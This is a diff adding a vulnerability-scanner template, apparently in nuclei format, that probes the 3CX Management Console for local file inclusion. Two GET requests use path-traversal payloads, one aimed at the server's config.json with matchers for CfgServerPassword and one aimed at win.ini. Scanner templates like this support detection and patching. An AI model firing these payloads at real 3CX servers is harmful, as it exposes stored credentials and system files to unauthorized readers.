@@ -1,0 +1,29 @@
+id: 3cx-management-console
+name: 3CX Management Console - Local File Inclusion
+severity: high
+confidence: tentative
+description: 3CX Management Console is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- 3cx
+- lfi
+- voip
+- vuln
+requests:
+- method: GET
+  path: /Electron/download/windows/..\..\..\Http\webroot\config.json
+  matchers: &id001
+  - type: body
+    words:
+    - CfgServerPassword
+    - CfgServerAppName
+  - type: body
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  condition: or
+- method: GET
+  path: /Electron/download/windows/\windows\win.ini
+  matchers: *id001
+  condition: or
